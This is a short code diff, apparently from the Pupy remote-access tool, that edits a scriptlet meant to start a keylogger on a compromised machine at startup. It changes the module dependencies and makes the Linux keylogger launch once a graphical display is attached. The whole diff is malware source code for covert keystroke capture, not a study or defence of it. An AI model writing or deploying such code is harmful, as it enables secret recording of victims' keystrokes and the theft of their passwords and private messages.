@@ -9,8 +9,8 @@ class ScriptletGenerator(Scriptlet):
     """ start the keylogger at startup """
 
     dependencies = {
-        'windows': [ 'ctypes.wintypes', 'pupwinutils.keylogger' ],
-        'linux': [ 'keylogger' ]
+        'windows': [ 'pupwinutils.keylogger' ],
+        'linux': [ 'pupyps', 'display', 'keylogger' ]
     }
     arguments={}
 
@@ -18,4 +18,4 @@ class ScriptletGenerator(Scriptlet):
         if os == 'windows':
             return 'import pupwinutils.keylogger; pupwinutils.keylogger.keylogger_start()'
         else:
-            return 'import keylogger; keylogger.keylogger_start()'
+            return 'import keylogger; import display; display.when_attached(keylogger.keylogger_start)'
